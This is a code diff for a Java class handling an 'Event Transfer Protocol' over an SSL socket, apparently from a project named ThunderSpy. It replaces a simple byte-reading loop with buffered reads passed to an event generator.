@@ -1,14 +1,18 @@
 package com.thunderspy.spy.utils.etp;
 
+import com.thunderspy.spy.utils.Constants;
 import com.thunderspy.spy.utils.ThreadPoolManager;
 import com.thunderspy.spy.utils.Utils;
 
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.util.HashMap;
 
 import javax.net.ssl.SSLSocket;
 
 /**
+ * ETP stands for Event Transfer Protocol
+ *
  * Created by ariyan on 2/14/17.
  */
 
@@ -22,19 +26,16 @@ public final class Protocol {
             is = sslSocket.getInputStream();
             os = sslSocket.getOutputStream();
 
-            int r = 0;
-            while((r = is.read()) != -1) {
-                if((char)r == 'A') {
-                    ThreadPoolManager.execute(new Runnable() {
-                        @Override
-                        public void run() {
-                            Utils.log(Thread.currentThread().getName());
-                        }
-                    });
+            ETPEventGenerator eventGenerator = new ETPEventGenerator(sslSocket);
+            byte[] buffer = new byte[Constants.SOCKET_STREAM_BUFFER_SIZE];
+            int bufferBytesRead;
+            boolean dataProcessed;
+            while ((bufferBytesRead = is.read(buffer)) != -1) {
+                dataProcessed = eventGenerator.processData(buffer, 0, bufferBytesRead);
+                if(!dataProcessed) {
+                    throw new Exception("Invalid protocol handshaking");
                 }
             }
-
-
             throw new Exception("Connection is lost to server");
         } catch (Exception exp) {
             Utils.log("ETP Error: %s", exp.getMessage());
@@ -58,6 +59,9 @@ public final class Protocol {
             } catch (Exception exp1) {}
         }
     }
+
+
+
 
 }
 
